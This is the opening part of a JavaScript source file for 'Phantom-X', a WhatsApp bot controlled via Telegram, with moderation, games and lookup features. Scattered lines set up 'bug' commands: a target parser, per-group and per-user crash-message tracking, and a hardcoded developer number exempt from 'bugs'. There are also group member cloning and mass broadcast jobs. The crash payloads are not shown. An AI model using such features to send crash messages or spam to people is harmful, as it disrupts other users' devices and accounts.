const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    DisconnectReason,
    fetchLatestBaileysVersion,
    getContentType,
    downloadMediaMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf } = require("telegraf");
const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const http = require("http");

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
if (!TELEGRAM_TOKEN) {
    throw new Error("Missing TELEGRAM_TOKEN environment variable. Add it as a Replit secret before starting Phantom-X.");
}
const telBot = new Telegraf(TELEGRAM_TOKEN);
const MAX_RETRIES = 5;
const BOT_VERSION = "1.0.0";
const SETTINGS_FILE = path.join(__dirname, "group_settings.json");
const SESSIONS_FILE = path.join(__dirname, "sessions.json");
const MODE_FILE = path.join(__dirname, "bot_mode.json");
const MENU_BANNER_FILE = path.join(__dirname, "menu_banner.jpg");
const THEME_FILE = path.join(__dirname, "menu_theme.json");

// Per-user state
const activeSockets = {};
const retryCounts = {};
const botJids = {};        // userId -> bot's own WhatsApp JID
const telegramCtxs = {};   // userId -> telegram ctx (for alerts)

// Anti-spam tracker: { jid: { count, lastTime } }
const spamTracker = {};

// GC Clone jobs: { groupJid: { members: [], index, interval } }
const cloneJobs = {};

// Broadcast jobs: { botJid: { intervalId, groups, index, total } }
const broadcastJobs = {};

// Saved group invite links for auto-rejoin: { groupJid: inviteCode }
const savedGroupLinks = {};

// Bug crash message keys for undo: { groupJid: [msgKey, ...] }
const groupCrashKeys = {};

// Personal bug message keys for undo: { userJid: [msgKey, ...] }
const userCrashKeys = {};

// Developer protection — bugs will never be sent to this number
const DEV_NUMBER = "2348102756072";

// Convert a plain phone number to WhatsApp JID
function numToJid(num) {
    const cleaned = (num || "").toString().replace(/[^0-9]/g, "");
    if (!cleaned) return null;
    return cleaned + "@s.whatsapp.net";
}

// Get bug target from command — accepts phone number param OR @mention
function parseBugTarget(parts, msg) {
    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    if (mentioned.length) return mentioned[0];
    if (parts[1] && /^\d{7,}$/.test(parts[1])) return numToJid(parts[1]);
    return null;
}

// Returns true if the JID belongs to the protected developer
function isDevProtected(jid) {
    if (!jid) return false;
    return jid.replace(/@s\.whatsapp\.net|@g\.us/, "") === DEV_NUMBER;
}

// Auto-join settings
const AUTOJOIN_FILE = path.join(__dirname, "autojoin.json");
function loadAutojoin() { if (!fs.existsSync(AUTOJOIN_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTOJOIN_FILE, "utf8")); } catch { return {}; } }
function saveAutojoin(d) { fs.writeFileSync(AUTOJOIN_FILE, JSON.stringify(d, null, 2)); }
const AUTOJOIN_BLACKLIST = ["porn", "18+", "adult", "xxx", "sex", "nude", "naked", "leak", "nudes", "18plus", "onlyfan"];

// --- WARNS ---
const WARNS_FILE = path.join(__dirname, "warns.json");
function loadWarns() { if (!fs.existsSync(WARNS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(WARNS_FILE, "utf8")); } catch { return {}; } }
function saveWarns(d) { fs.writeFileSync(WARNS_FILE, JSON.stringify(d, null, 2)); }
function getWarnCount(groupJid, userJid) { return loadWarns()[groupJid]?.[userJid] || 0; }
function addWarn(groupJid, userJid) { const d = loadWarns(); if (!d[groupJid]) d[groupJid] = {}; d[groupJid][userJid] = (d[groupJid][userJid] || 0) + 1; saveWarns(d); return d[groupJid][userJid]; }
function resetWarns(groupJid, userJid) { const d = loadWarns(); if (d[groupJid]) { delete d[groupJid][userJid]; saveWarns(d); } }
function getAllWarns(groupJid) { return loadWarns()[groupJid] || {}; }

// --- BANS (bot-level, per botJid) ---
const BANS_FILE = path.join(__dirname, "bans.json");
function loadBans() { if (!fs.existsSync(BANS_FILE)) return {}; try { return JSON.parse(fs.readFileSync(BANS_FILE, "utf8")); } catch { return {}; } }
function saveBans(d) { fs.writeFileSync(BANS_FILE, JSON.stringify(d, null, 2)); }
function isBanned(botJid, userJid) { return (loadBans()[botJid] || []).includes(userJid); }
function addBan(botJid, userJid) { const d = loadBans(); if (!d[botJid]) d[botJid] = []; if (!d[botJid].includes(userJid)) d[botJid].push(userJid); saveBans(d); }
function removeBan(botJid, userJid) { const d = loadBans(); if (d[botJid]) { d[botJid] = d[botJid].filter(j => j !== userJid); saveBans(d); } }

// --- SCHEDULES ---
const SCHEDULES_FILE = path.join(__dirname, "schedules.json");
const scheduleTimers = {};
function loadSchedules() { if (!fs.existsSync(SCHEDULES_FILE)) return {}; try { return JSON.parse(fs.readFileSync(SCHEDULES_FILE, "utf8")); } catch { return {}; } }
function saveSchedules(d) { fs.writeFileSync(SCHEDULES_FILE, JSON.stringify(d, null, 2)); }

// --- GAME STATE (hangman, trivia, numguess, scramble) ---
const hangmanState = {};
const triviaState = {};
const numGuessState = {};
const scrambleState = {};

// --- RANDOM CONTENT ARRAYS ---
const JOKES = [
    "Why don't scientists trust atoms? Because they make up everything! 😂",
    "I told my wife she was drawing her eyebrows too high. She looked surprised. 😂",
    "Why do cows wear bells? Because their horns don't work! 🐄",
    "I asked my dog what two minus two is. He said nothing. 🐶",
    "Why can't you give Elsa a balloon? Because she'll let it go! ❄️",
    "What do you call a fake noodle? An impasta! 🍝",
    "Why did the scarecrow win an award? He was outstanding in his field! 🌾",
    "I'm reading a book about anti-gravity. It's impossible to put down! 📚",
    "Why did the bicycle fall over? Because it was two-tired! 🚲",
    "What do you call cheese that isn't yours? Nacho cheese! 🧀",
    "Why did the math book look so sad? It had too many problems! 📖",
    "I used to hate facial hair but then it grew on me! 😂",
    "How do you organize a space party? You planet! 🚀",
    "Why don't eggs tell jokes? They'd crack each other up! 🥚",
    "What do you call a sleeping dinosaur? A dino-snore! 🦕",
];
const FACTS = [
    "🧠 Humans share 50% of their DNA with bananas.",
    "🐘 Elephants are the only animals that can't jump.",
    "🌍 Nigeria is home to more English speakers than England itself.",
    "🦈 Sharks are older than trees — they've existed for 450 million years.",
    "🍯 Honey never expires. 3000-year-old honey found in Egyptian tombs was still edible.",
    "🌙 A day on Venus is longer than a year on Venus.",
    "🦋 Butterflies taste with their feet.",
    "💡 The lighter was invented before the match.",
    "🐙 Octopuses have three hearts and blue blood.",
    "🌊 The ocean covers 71% of Earth but 95% of it is still unexplored.",
    "🧲 A teaspoon of neutron star would weigh 6 billion tonnes.",
    "🐌 Snails can sleep for up to 3 years.",
    "🎵 Music can trigger the same brain response as food or sex.",
    "📱 The first iPhone was released in 2007. WhatsApp didn't exist until 2009.",
    "🌿 There are more trees on Earth than stars in the Milky Way.",
];
const QUOTES = [
    "💬 \"The secret of getting ahead is getting started.\" — Mark Twain",
    "💬 \"In the middle of every difficulty lies opportunity.\" — Albert Einstein",
    "💬 \"It does not matter how slowly you go as long as you do not stop.\" — Confucius",
    "💬 \"Success is not final; failure is not fatal: it is the courage to continue that counts.\" — Churchill",
    "💬 \"Believe you can and you're halfway there.\" — Theodore Roosevelt",
    "💬 \"The only way to do great work is to love what you do.\" — Steve Jobs",
    "💬 \"Don't watch the clock; do what it does. Keep going.\" — Sam Levenson",
    "💬 \"An investment in knowledge pays the best interest.\" — Benjamin Franklin",
    "💬 \"The future belongs to those who believe in the beauty of their dreams.\" — Eleanor Roosevelt",
    "💬 \"You miss 100% of the shots you don't take.\" — Wayne Gretzky",
    "💬 \"Hard work beats talent when talent doesn't work hard.\" — Tim Notke",
    "💬 \"The man who has no imagination has no wings.\" — Muhammad Ali",
    "💬 \"Fall seven times, stand up eight.\" — Japanese Proverb",
    "💬 \"No pressure, no diamonds.\" — Thomas Carlyle",
    "💬 \"A smooth sea never made a skilled sailor.\" — Franklin D. Roosevelt",
];
const ROASTS = [
    "📵 Your WiFi signal has a better connection than your personality.",
    "🧠 I'd roast you, but my mum said I'm not allowed to burn trash.",
    "👁️ You have the face of a saint — a Saint Bernard.",
    "📚 You're proof that evolution can go in reverse.",
    "💤 I'd agree with you, but then we'd both be wrong.",
    "🪟 If laughter is the best medicine, your face must be curing diseases.",
    "🏃 You're not stupid; you just have bad luck thinking.",
    "🎭 I've seen better looking things crawl out of soup.",
    "🕹️ You're like a software update. Whenever I see you, I think 'not now'.",
    "📉 You have miles to go before you reach mediocre.",
    "🎪 Your brain must be the size of a pebble. Cute, but useless.",
    "🔋 You have the energy of a dying phone battery.",
    "🗑️ I'd insult your intelligence, but I'm not sure you have any.",
    "😴 You're so boring even your phone goes to sleep around you.",
    "🌚 I'm not saying I hate you, but I'd unplug your life support for a charger.",
];
const COMPLIMENTS = [
    "🌟 You are genuinely one of the most amazing people in this group!",
    "💛 Your energy brightens up every conversation you're in. Keep shining!",
    "🏆 You have the kind of intelligence that makes the room smarter.",
    "🌸 You're the human equivalent of a warm cup of tea on a cold day.",
    "🎯 You have an incredible ability to make people feel heard and valued.",
    "🚀 Honestly? The world is better because you're in it.",
    "💎 You're rare. Not everybody has the depth of character you carry.",
    "🧠 You think in a way most people can't — and that's your superpower.",
    "🔥 You work harder than 90% of people and it shows. Respect.",
    "🌺 Your kindness is contagious. People leave conversations with you feeling better.",
    "⚡ You have a vibe that can't be faked. Stay real.",
    "👑 You're built different. Don't ever let anyone dim that.",
    "🌍 Your potential is literally limitless. Chase it.",
    "💯 You're exactly the kind of person people are grateful to know.",
    "🕊️ You make people feel safe. That's a rare and powerful gift.",
];
const EIGHTBALL = [
    "✅ It is certain.", "✅ Without a doubt.", "✅ Yes definitely!",
    "✅ You may rely on it.", "✅ As I see it, yes.", "✅ Most likely.",
    "🤷 Reply hazy, try again.", "🤷 Ask again later.", "🤷 Better not tell you now.",
    "🤷 Cannot predict now.", "🤷 Concentrate and ask again.",
    "❌ Don't count on it.", "❌ My reply is no.", "❌ My sources say no.",
    "❌ Outlook not so good.", "❌ Very doubtful.",
];
const HANGMAN_WORDS = ["phantom","nigeria","whatsapp","telegram","javascript","keyboard","elephant","football","lightning","champion","universe","sunshine","waterfall","mountain","butterfly","network","software","wireless","password","keyboard","government","tropical","abundance","satellite","emergency","community","democracy","education","knowledge","adventure","celebrate","discovery","excellent","beautiful","integrity","creativity","hurricane","evolution","migration","resilience"];
const TRIVIA_QUESTIONS = [
    { q: "What is the capital of Nigeria?", a: "abuja", hint: "It starts with A" },
    { q: "How many states does Nigeria have?", a: "36", hint: "It's a number between 35 and 37" },
    { q: "What year did Nigeria gain independence?", a: "1960", hint: "Think early 1960s" },
    { q: "What is 15 × 15?", a: "225", hint: "It's greater than 200" },
    { q: "Which planet is known as the Red Planet?", a: "mars", hint: "Named after the Roman god of war" },
    { q: "What is the largest ocean on Earth?", a: "pacific", hint: "It's the biggest" },
    { q: "How many sides does a hexagon have?", a: "6", hint: "Between 5 and 7" },
    { q: "What is the chemical symbol for gold?", a: "au", hint: "From the Latin word 'aurum'" },
    { q: "Who invented the telephone?", a: "bell", hint: "His last name is also a sound" },
    { q: "What is the fastest land animal?", a: "cheetah", hint: "Spotted big cat" },
    { q: "What gas do plants absorb?", a: "co2", hint: "Also written as carbon dioxide" },
    { q: "What is the boiling point of water in Celsius?", a: "100", hint: "Triple digits" },
    { q: "Which country has the largest population?", a: "india", hint: "South Asian country" },
    { q: "What is 8 squared?", a: "64", hint: "Between 60 and 70" },
    { q: "Who wrote Romeo and Juliet?", a: "shakespeare", hint: "Famous English playwright" },
];
const RIDDLES = [
    { q: "I speak without a mouth and hear without ears. I have no body but come alive with wind. What am I?", a: "echo", hint: "You hear me after you speak" },
    { q: "The more you take, the more you leave behind. What am I?", a: "footsteps", hint: "Think about walking" },
    { q: "I have cities but no houses. Mountains but no trees. Water but no fish. What am I?", a: "map", hint: "You use me to find places" },
    { q: "What can you catch but never throw?", a: "cold", hint: "It makes you sneeze" },
    { q: "I'm tall when young, short when old. What am I?", a: "candle", hint: "I give off light and melt" },
    { q: "What has hands but can't clap?", a: "clock", hint: "You check me for the time" },
    { q: "What gets wetter the more it dries?", a: "towel", hint: "You use it after a shower" },
    { q: "What has many keys but can't open a single lock?", a: "keyboard", hint: "You're typing on one right now... maybe" },
    { q: "I have a head, a tail, but no body. What am I?", a: "coin", hint: "You flip me for decisions" },
    { q: "What goes up but never comes down?", a: "age", hint: "Everyone has this and it always increases" },
    { q: "I'm light as a feather but even the strongest person can't hold me for more than a minute. What am I?", a: "breath", hint: "You're doing it right now" },
    { q: "What runs but never walks, has a mouth but never talks, has a bed but never sleeps?", a: "river", hint: "Flows through nature" },
    { q: "The more you have of me, the less you see. What am I?", a: "darkness", hint: "Turn the lights off" },
    { q: "What can travel around the world while staying in a corner?", a: "stamp", hint: "Found on envelopes" },
];

const WOULD_U_RATHER = [
    "Would you rather be able to fly OR be invisible?",
    "Would you rather lose your phone for a week OR your wallet for a week?",
    "Would you rather have no internet for a month OR no WhatsApp forever?",
    "Would you rather be famous but poor OR rich but unknown?",
    "Would you rather always speak your mind OR never speak again?",
    "Would you rather live without music OR live without social media?",
    "Would you rather know when you'll die OR how you'll die?",
    "Would you rather be 10 years older OR 10 years younger?",
    "Would you rather have super strength OR super speed?",
    "Would you rather eat jollof rice every day OR never eat jollof rice again?",
    "Would you rather be able to talk to animals OR speak every human language?",
    "Would you rather never use your phone again OR never watch TV again?",
    "Would you rather have $1 million now OR $5 million in 10 years?",
    "Would you rather always be cold OR always be hot?",
    "Would you rather be the funniest person OR the smartest person in the room?",
];

const HOROSCOPES = {
    aries:       "🐏 *Aries (Mar 21 – Apr 19)*\n\n🔥 Today your energy is unstoppable. A bold move you've been hesitating on is worth taking. Trust your gut — confidence is your superpower right now.",
    taurus:      "🐂 *Taurus (Apr 20 – May 20)*\n\n🌿 Slow down and enjoy today. Good things are building behind the scenes. Don't rush — your patience will pay off more than you expect.",
    gemini:      "👯 *Gemini (May 21 – Jun 20)*\n\n💨 Your mind is sharp and your words carry weight today. A conversation you have could open a new door. Stay curious.",
    cancer:      "🦀 *Cancer (Jun 21 – Jul 22)*\n\n🌊 Emotions run deep today. Protect your peace — not everyone deserves access to your energy. Focus on people who reciprocate your love.",
    leo:         "🦁 *Leo (Jul 23 – Aug 22)*\n\n☀️ You're in your element. People are watching and taking notes. This is your moment to lead and shine — own it.",
    virgo:       "♍ *Virgo (Aug 23 – Sep 22)*\n\n📋 Your attention to detail saves the day. Something that seemed messy is becoming clearer. Trust the process you've been working on.",
    libra:       "⚖️ *Libra (Sep 23 – Oct 22)*\n\n🎨 Balance is key today. A situation that felt unfair may find resolution. Beauty, harmony and peace are drawn to you right now.",
    scorpio:     "🦂 *Scorpio (Oct 23 – Nov 21)*\n\n🔮 Deep insights are coming. What seemed hidden is being revealed. Use your instincts — you already know more than you think.",
    sagittarius: "🏹 *Sagittarius (Nov 22 – Dec 21)*\n\n🌟 Adventure is calling. You're being pulled toward something bigger. Say yes to new experiences — growth is waiting.",
    capricorn:   "🐐 *Capricorn (Dec 22 – Jan 19)*\n\n🏔️ Discipline wins today. Stay focused on your goals and ignore the noise. The hard work you've been putting in is closer to payoff than you think.",
    aquarius:    "🏺 *Aquarius (Jan 20 – Feb 18)*\n\n⚡ You're ahead of your time and people are starting to notice. Share your ideas — your unique thinking is your greatest asset.",
    pisces:      "🐟 *Pisces (Feb 19 – Mar 20)*\n\n🌙 Trust your dreams and intuition today. A creative idea or feeling you've dismissed deserves another look. Magic is in the details.",
};

const SCRAMBLE_WORDS = [
    { word: "phantom", hint: "👻 A ghost-like entity" },
    { word: "nigeria", hint: "🌍 A West African country" },
    { word: "android", hint: "🤖 A mobile operating system" },
    { word: "football", hint: "⚽ The world's most popular sport" },
    { word: "telegram", hint: "📱 A messaging app" },
    { word: "music", hint: "🎵 Sound organized in time" },
    { word: "laptop", hint: "💻 A portable computer" },
    { word: "jungle", hint: "🌿 A thick tropical forest" },
    { word: "diamond", hint: "💎 The hardest natural material" },
    { word: "chicken", hint: "🐔 A common farm bird" },
    { word: "airport", hint: "✈️ Where planes take off and land" },
    { word: "market", hint: "🛒 A place to buy and sell" },
    { word: "ocean", hint: "🌊 A massive body of saltwater" },
    { word: "kingdom", hint: "👑 A land ruled by a king or queen" },
    { word: "battery", hint: "🔋 Stores electrical energy" },
    { word: "thunder", hint: "⛈️ The loud sound after lightning" },
    { word: "glasses", hint: "👓 Used to correct eyesight" },
    { word: "blanket", hint: "🛏️ Keeps you warm while sleeping" },
    { word: "village", hint: "🏡 A small rural settlement" },
    { word: "captain", hint: "⚓ Leader of a ship or team" },
];

// Saved group names: { groupJid: groupName }
const groupNames = {};

// Auto-react: { groupJid: emoji }
const AUTO_REACT_FILE = path.join(__dirname, "auto_react.json");
function loadAutoReact() { if (!fs.existsSync(AUTO_REACT_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTO_REACT_FILE, "utf8")); } catch { return {}; } }
function saveAutoReact(d) { fs.writeFileSync(AUTO_REACT_FILE, JSON.stringify(d, null, 2)); }

// Auto-reply keywords: { keyword: replyText }
const AUTO_REPLY_FILE = path.join(__dirname, "auto_reply.json");
function loadAutoReply() { if (!fs.existsSync(AUTO_REPLY_FILE)) return {}; try { return JSON.parse(fs.readFileSync(AUTO_REPLY_FILE, "utf8")); } catch { return {}; } }
function saveAutoReply(d) { fs.writeFileSync(AUTO_REPLY_FILE, JSON.stringify(d, null, 2)); }

// Command aliases: { alias: realCommand }
const ALIASES_FILE = path.join(__dirname, "aliases.json");
function loadAliases() { if (!fs.existsSync(ALIASES_FILE)) return {}; try { return JSON.parse(fs.readFileSync(ALIASES_FILE, "utf8")); } catch { return {}; } }
function saveAliases(d) { fs.writeFileSync(ALIASES_FILE, JSON.stringify(d, null, 2)); }

// Presence tracker: { jid: 'available'|'unavailable'|'composing'|... }
const presenceTracker = {};

// --- SETTINGS ---
function loadSettings() {
    if (!fs.existsSync(SETTINGS_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, "utf8")); } catch { return {}; }
}

function saveSettings(settings) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2));
}

function getGroupSetting(groupJid, key, def = false) {
    const s = loadSettings();
    return s[groupJid]?.[key] ?? def;
}

function setGroupSetting(groupJid, key, value) {
    const s = loadSettings();
    if (!s[groupJid]) s[groupJid] = {};
    s[groupJid][key] = value;
    saveSettings(s);
}

// --- BOT MODE (public / owner) ---
function loadModes() {
    if (!fs.existsSync(MODE_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(MODE_FILE, "utf8")); } catch { return {}; }
}
function saveModes(d) { fs.writeFileSync(MODE_FILE, JSON.stringify(d, null, 2)); }
function getBotMode(botJid) {
    if (!botJid) return "public";
    return loadModes()[botJid] || "public";
}
function setBotMode(botJid, mode) {
    const d = loadModes();
    d[botJid] = mode;
    saveModes(d);
}

// --- MENU THEME ---
function loadThemeData() {
    if (!fs.existsSync(THEME_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(THEME_FILE, "utf8")); } catch { return {}; }
}
function getMenuTheme(botJid) {
    if (!botJid) return 1;
    return loadThemeData()[botJid] || 1;
}
function setMenuTheme(botJid, n) {
    const d = loadThemeData();
    d[botJid] = n;
    fs.writeFileSync(THEME_FILE, JSON.stringify(d, null, 2));
}

// --- HELPERS ---
function getAuthDir(userId) {
    return path.join(__dirname, "auth_info", String(userId));
}

function clearAuthState(userId) {
    const authDir = getAuthDir(userId);
    if (fs.existsSync(authDir)) fs.rmSync(authDir, { recursive: true, force: true });
}

// --- SESSION PERSISTENCE ---
function loadSessions() {
    if (!fs.existsSync(SESSIONS_FILE)) return {};
    try { return JSON.parse(fs.readFileSync(SESSIONS_FILE, "utf8")); } catch { return {}; }
}

function saveSession(userId, phoneNumber, chatId) {
    const sessions = loadSessions();
    sessions[userId] = { phoneNumber, chatId };
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
}

function deleteSession(userId) {
    const sessions = loadSessions();
    delete sessions[userId];
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions, null, 2));
}

// Build a ctx-like wrapper using chat ID so we can send Telegram messages after restart
function makeFakeCtx(chatId) {
    return {
        reply: (text, extra) => telBot.telegram.sendMessage(chatId, text, extra || {}),
        from: { id: chatId },
    };
}

function formatUptime() {
    const s = Math.floor(process.uptime());
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const sec = s % 60;
    return `${h}h ${m}m ${sec}s`;
}

function fetchBuffer(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            const chunks = [];
            res.on("data", (c) => chunks.push(c));
            res.on("end", () => resolve(Buffer.concat(chunks)));
            res.on("error", reject);
        }).on("error", reject);
    });
}

function containsLink(text) {
    return /https?:\/\/|wa\.me\/|chat\.whatsapp\.com\/|bit\.ly\/|t\.me\//i.test(text);
}

// --- FETCH JSON (for APIs) ---
function fetchJSON(url) {
    return new Promise((resolve, reject) => {
        https.get(url, { headers: { "User-Agent": "Mozilla/5.0" } }, (res) => {
            let data = "";
            res.on("data", c => data += c);
            res.on("end", () => { try { resolve(JSON.parse(data)); } catch { reject(new Error("Invalid JSON")); } });
            res.on("error", reject);
        }).on("error", reject);
    });
}

// --- RESOLVE GROUP LINK OR JID ---
async function resolveGroupJid(sock, input) {
    input = input.trim();
    if (input.endsWith("@g.us")) return input;
    if (input.includes("chat.whatsapp.com/")) {
        const code = input.split("chat.whatsapp.com/")[1].trim();
        const info = await sock.groupGetInviteInfo(code);
        return info.id;
    }
    throw new Error("Invalid input. Use a group link (chat.whatsapp.com/...) or group ID (ending in @g.us).");
}

// --- OCR (Extract text from image via OCR.space free API) ---
function ocrFromBuffer(imageBuffer) {
    return new Promise((resolve, reject) => {
        const base64 = imageBuffer.toString("base64");
        const postData = `base64Image=data:image/jpeg;base64,${encodeURIComponent(base64)}&language=eng&isOverlayRequired=false`;
        const req = https.request({
            hostname: "api.ocr.space",
            path: "/parse/image",
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded", "apikey": "helloworld" },
        }, (res) => {
            let data = "";
            res.on("data", c => data += c);
            res.on("end", () => {
                try {
                    const result = JSON.parse(data);
                    const text = result.ParsedResults?.[0]?.ParsedText || "";
                    resolve(text.trim());
                } catch { reject(new Error("OCR parse failed")); }
            });
        });
        req.on("error", reject);
        req.write(postData);
        req.end();
    });
}

// --- FOOTBALL HELPERS (ESPN unofficial API) ---
const AUTO_REACT_EMOJIS = ["❤️", "🔥", "😂", "👍", "😍", "🎉", "💯", "🙏", "😎", "🤩"];

async function getPLTable() {
    const data = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/standings");
    const entries = data.standings?.[0]?.entries || [];
    let text = "🏆 *Premier League Table*\n━━━━━━━━━━━━━━━━━━━\n";
    for (let i = 0; i < Math.min(entries.length, 20); i++) {
        const e = entries[i];
        const stats = {};
        for (const s of e.stats || []) stats[s.name] = s.displayValue ?? s.value;
        text += `*${i + 1}.* ${e.team.displayName} — P:${stats.gamesPlayed || 0} W:${stats.wins || 0} D:${stats.ties || 0} L:${stats.losses || 0} *Pts:${stats.points || 0}*\n`;
    }
    return text;
}

async function getLiveScores() {
    const data = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/scoreboard");
    const events = data.events || [];
    if (!events.length) return "⚽ No Premier League matches happening right now.";
    let text = "🔴 *Live / Today's PL Matches*\n━━━━━━━━━━━━━━━━━━━\n";
    for (const ev of events) {
        const comp = ev.competitions?.[0];
        const home = comp?.competitors?.find(c => c.homeAway === "home");
        const away = comp?.competitors?.find(c => c.homeAway === "away");
        const status = ev.status?.type?.shortDetail || "";
        text += `⚽ ${home?.team?.shortDisplayName} *${home?.score || 0}* - *${away?.score || 0}* ${away?.team?.shortDisplayName}\n📍 ${status}\n\n`;
    }
    return text;
}

async function getClubInfo(sock, from, teamName) {
    const teamsData = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/teams?limit=50");
    const teams = teamsData.sports?.[0]?.leagues?.[0]?.teams || [];
    const team = teams.find(t => t.team.displayName.toLowerCase().includes(teamName.toLowerCase()) || t.team.shortDisplayName.toLowerCase().includes(teamName.toLowerCase()));
    return team ? team.team : null;
}

async function getClubFixtures(teamName) {
    const teamsData = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/teams?limit=50");
    const teams = teamsData.sports?.[0]?.leagues?.[0]?.teams || [];
    const team = teams.find(t => t.team.displayName.toLowerCase().includes(teamName.toLowerCase()) || t.team.shortDisplayName.toLowerCase().includes(teamName.toLowerCase()));
    if (!team) return null;
    const id = team.team.id;
    const sched = await fetchJSON(`https://site.api.espn.com/apis/v2/sports/soccer/eng.1/teams/${id}/schedule`);
    const events = sched.events || [];
    const upcoming = events.filter(e => e.competitions?.[0]?.status?.type?.state !== "post").slice(0, 5);
    const past = events.filter(e => e.competitions?.[0]?.status?.type?.state === "post").slice(-3);
    let text = `⚽ *${team.team.displayName} — Fixtures & Results*\n━━━━━━━━━━━━━━━━━━━\n`;
    if (past.length) {
        text += "\n📋 *Recent Results:*\n";
        for (const ev of past) {
            const comp = ev.competitions?.[0];
            const home = comp?.competitors?.find(c => c.homeAway === "home");
            const away = comp?.competitors?.find(c => c.homeAway === "away");
            text += `• ${home?.team?.shortDisplayName} ${home?.score}-${away?.score} ${away?.team?.shortDisplayName}\n`;
        }
    }
    if (upcoming.length) {
        text += "\n📅 *Upcoming Fixtures:*\n";
        for (const ev of upcoming) {
            const date = new Date(ev.date).toLocaleDateString("en-NG", { weekday: "short", day: "numeric", month: "short" });
            const comp = ev.competitions?.[0];
            const home = comp?.competitors?.find(c => c.homeAway === "home");
            const away = comp?.competitors?.find(c => c.homeAway === "away");
            text += `• ${date}: ${home?.team?.shortDisplayName} vs ${away?.team?.shortDisplayName}\n`;
        }
    }
    if (!past.length && !upcoming.length) text += "No fixtures found.";
    return text;
}

// --- SONG SEARCH (iTunes API, free, no key) ---
async function searchSongs(query) {
    const encoded = encodeURIComponent(query);
    const data = await fetchJSON(`https://itunes.apple.com/search?term=${encoded}&entity=song&limit=6`);
    return data.results || [];
}

// --- LYRICS (lyrics.ovh, free, no key) ---
async function getLyrics(artist, title) {
    const data = await fetchJSON(`https://api.lyrics.ovh/v1/${encodeURIComponent(artist)}/${encodeURIComponent(title)}`);
    return data.lyrics || null;
}

// --- IMAGE GENERATION (Pollinations.ai, completely free, no key needed) ---
function buildImageGenUrl(prompt) {
    return `https://image.pollinations.ai/prompt/${encodeURIComponent(prompt)}?width=768&height=768&nologo=true`;
}

// --- SCREENSHOT (thum.io, free, no key) ---
function buildScreenshotUrl(url) {
    if (!url.startsWith("http")) url = "https://" + url;
    return `https://image.thum.io/get/width/1280/crop/800/${url}`;
}

// --- GAME STATE ---
const gameState = {}; // { chatJid: { type, board, players, turn, ... } }

function renderTTTBoard(board) {
    const symbols = { "X": "❌", "O": "⭕", "": "⬜" };
    return [
        `${symbols[board[0]]}${symbols[board[1]]}${symbols[board[2]]}`,
        `${symbols[board[3]]}${symbols[board[4]]}${symbols[board[5]]}`,
        `${symbols[board[6]]}${symbols[board[7]]}${symbols[board[8]]}`,
    ].join("\n") + "\n\n1️⃣2️⃣3️⃣\n4️⃣5️⃣6️⃣\n7️⃣8️⃣9️⃣";
}

function checkTTTWin(board, mark) {
    const wins = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
    return wins.some(([a,b,c]) => board[a] === mark && board[b] === mark && board[c] === mark);
}

const TRUTHS = [
    "What is the most embarrassing thing you've ever done?",
    "What is your biggest fear?",
    "Have you ever lied to get out of trouble?",
    "What is something you've never told anyone?",
    "What is the worst thing you've ever done?",
    "Who do you have a crush on right now?",
    "What is your most used app on your phone?",
    "Have you ever cheated on a test?",
    "What is your biggest regret?",
    "What is the strangest dream you've ever had?",
];

const DARES = [
    "Send a voice note singing any song for 10 seconds.",
    "Change your WhatsApp status to something embarrassing for 10 minutes.",
    "Send a selfie right now.",
    "Call someone in this group and sing happy birthday.",
    "Write a love letter to the person above you in this chat.",
    "Send your last 3 emojis you used.",
    "Post your last Google search.",
    "Do 20 push-ups and send a video proof.",
    "Let someone else send one message from your phone.",
    "Speak in rhymes for your next 3 messages.",
];

async function getClubNews(teamName) {
    const teamsData = await fetchJSON("https://site.api.espn.com/apis/v2/sports/soccer/eng.1/teams?limit=50");
    const teams = teamsData.sports?.[0]?.leagues?.[0]?.teams || [];
    const team = teams.find(t => t.team.displayName.toLowerCase().includes(teamName.toLowerCase()) || t.team.shortDisplayName.toLowerCase().includes(teamName.toLowerCase()));
    if (!team) return null;
    const id = team.team.id;
    const newsData = await fetchJSON(`https://site.api.espn.com/apis/v2/sports/soccer/eng.1/news?team=${id}&limit=5`);
    const articles = newsData.articles || [];
    if (!articles.length) return `No recent news found for ${team.team.displayName}.`;
    let text = `📰 *${team.team.displayName} — Latest News*\n━━━━━━━━━━━━━━━━━━━\n`;
    for (const a of articles) {
        const date = new Date(a.published).toLocaleDateString("en-NG", { day: "numeric", month: "short" });
        text += `\n📌 *${a.headline}*\n_${date}_ — ${a.description || ""}\n`;
    }
    return text;
}

// --- MENU SECTIONS DATA ---
function getMenuSections() {
    return [
        { emoji: '📋', title: 'GENERAL', items: [
            ['.menu / .phantom'], ['.info'], ['.help'], ['.ping'],
            ['.setpp'], ['.menudesign 1-20'], ['.mode public/owner'],
        ]},
        { emoji: '⚠️', title: 'MODERATION', items: [
            ['.warn @user'], ['.warnlist'], ['.resetwarn @user'],
            ['.ban @user'], ['.unban @user'],
        ]},
        { emoji: '👥', title: 'GROUP MANAGEMENT', items: [
            ['.add ‹number›'], ['.kick @user'], ['.promote @user'],
            ['.demote @user'], ['.link'], ['.revoke'],
